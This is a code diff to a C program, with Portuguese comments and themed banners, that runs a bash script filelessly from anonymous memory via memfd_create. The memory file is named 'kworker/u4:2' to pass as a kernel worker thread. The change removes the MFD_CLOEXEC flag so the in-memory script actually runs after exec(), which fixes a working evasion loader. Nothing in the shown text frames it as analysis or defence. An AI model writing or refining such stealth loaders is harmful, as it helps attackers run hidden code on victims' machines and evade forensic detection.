@@ -14,7 +14,8 @@ int main() {
     printf("\033[38;5;196m[*] INVOCANDO O FANTASMA. ALOCANDO MEMÓRIA ANÔNIMA...\033[0m\n");
 
     // Cria um arquivo invisível apenas na memória RAM (Disfarçado como processo do Kernel)
-    int fd = memfd_create("kworker/u4:2", MFD_CLOEXEC);
+    // NOTA: Sem MFD_CLOEXEC para que o FD sobreviva ao exec()
+    int fd = memfd_create("kworker/u4:2", 0);
     if (fd == -1) {
         perror("memfd_create");
         return 1;
@@ -34,6 +35,7 @@ int main() {
     printf("\033[38;5;118m[+] EXECUTANDO ARTEFATO INVISÍVEL EM: %s\033[0m\n", path);
     
     // Transmutação: O processo atual se torna o script rodando na RAM
+    // O FD é herdado porque não usamos MFD_CLOEXEC
     execl("/bin/bash", "bash", path, NULL);
     
     return 0;
